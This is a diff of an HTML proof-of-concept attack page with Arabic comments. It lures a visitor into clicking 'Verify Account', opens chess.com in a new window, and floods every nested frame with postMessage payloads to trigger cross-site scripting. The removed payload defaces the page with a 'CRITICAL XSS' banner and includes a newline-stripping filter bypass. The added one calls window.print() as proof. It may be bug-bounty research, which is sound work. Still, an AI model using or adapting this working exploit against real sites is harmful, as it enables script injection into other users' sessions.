@@ -16,52 +16,47 @@
     <button onclick="startAttack()">Verify Account</button>
 
     <script>
-        // الـ Payload المرعب: بيطلع للصفحة الرئيسية ويمسحها ويحط رسالة الاختراق
-        let payload = `
-            try {
-                window.top.document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:999999;color:white;font-size:50px;font-weight:bold;text-align:center;padding-top:20%;">CRITICAL XSS BY HUSSEIN</div>';
-            } catch(e) {}
-            // get_3p
-        `.replace(/\n/g, ''); // بنشيل السطور الجديدة عشان الفلتر
-
+        // Payload الإثبات البصري (نافذة الطباعة)
+        let payload = "window.print(); // get_ext";
         let spammer;
 
-        // دالة الضرب العنقودي
+        // دالة الضرب العنقودي (Recursion)
         function blastFrames(win) {
             try {
                 win.postMessage(payload, "*");
             } catch(e) {}
             
             try {
-                for (let i = 0; i < win.length; i++) {
-                    blastFrames(win[i]);
+                // الدخول للـ Iframes اللي جوه النافذة الجديدة
+                for (let i = 0; i < win.frames.length; i++) {
+                    blastFrames(win.frames[i]);
                 }
             } catch(e) {}
         }
 
-        // بدء الهجوم
+        // دالة الهجوم اللي بتشتغل لما الضحية يدوس على الزرار
         function startAttack() {
-            // 1. فتح Chess.com
-            let victimWin = window.open("https://www.chess.com", "victimWindow");
+            // 1. فتح الموقع في نافذة جديدة أو تاب جديدة
+            let victimWin = window.open("https://www.chess.com/member/hussein-e3", "victimWindow");
 
-            // 2. نستنى 4 ثواني عشان الإعلانات تحمل
+            // 2. نستنى 3 ثواني لحد ما الموقع يحمل إعلاناته
             setTimeout(() => {
                 console.log("Starting the blast...");
                 
-                // 3. سبام كل 10 ملي ثانية
+                // 3. نضرب النافذة الجديدة كل 10 ملي ثانية
                 spammer = setInterval(() => {
                     if(victimWin) {
                         blastFrames(victimWin);
                     }
                 }, 10);
 
-                // 4. نوقف بعد ثانيتين
+                // 4. نوقف الضرب بعد 10 ثواني عشان المتصفح ميهنجش
                 setTimeout(() => {
                     clearInterval(spammer);
                     console.log("Blasting finished.");
-                }, 2000);
+                }, 10000);
 
-            }, 4000);
+            }, 3000);
         }
     </script>
 </body>
